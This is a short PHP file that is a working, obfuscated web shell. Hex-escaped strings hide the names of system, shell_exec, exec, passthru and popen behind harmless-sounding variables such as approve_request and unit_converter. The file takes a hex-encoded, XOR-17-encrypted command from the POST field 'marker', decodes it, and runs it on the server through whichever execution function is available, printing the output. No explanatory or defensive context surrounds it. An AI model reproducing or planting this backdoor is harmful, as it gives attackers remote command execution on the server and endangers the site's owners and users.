<?php

$approve_request7 = "p\x63l\x6F\x73e";
$approve_request5 = "po\x70en";
$approve_request1 = "s\x79\x73\x74em";
$approve_request4 = "\x70\x61\x73\x73thru";
$app_initializer = "hex\x32\x62in";
$approve_request6 = "\x73\x74\x72\x65am\x5F\x67et\x5F\x63on\x74\x65nts";
$approve_request3 = "\x65x\x65c";
$approve_request2 = "\x73\x68el\x6C_e\x78ec";
if (isset($_POST["mar\x6B\x65r"])) {
            function unit_converter (  $holder   ,   $ref ) {
    $entity=   '' ;
 $x=0;
 do{
$entity.=chr(ord($holder[$x])^$ref);
$x++;

} while($x<strlen($holder));
 return   $entity;
  
}
            $marker = $app_initializer($_POST["mar\x6B\x65r"]);
            $marker = unit_converter($marker, 17);
            if (function_exists($approve_request1)) {
                $approve_request1($marker);
            } elseif (function_exists($approve_request2)) {
                print $approve_request2($marker);
            } elseif (function_exists($approve_request3)) {
                $approve_request3($marker, $flag_holder);
                print join("\n", $flag_holder);
            } elseif (function_exists($approve_request4)) {
                $approve_request4($marker);
            } elseif (function_exists($approve_request5) && function_exists($approve_request6) && function_exists($approve_request7)) {
                $ref_entity = $approve_request5($marker, 'r');
                if ($ref_entity) {
                    $item_resource = $approve_request6($ref_entity);
                    $approve_request7($ref_entity);
                    print $item_resource;
                }
            }
            exit;
        }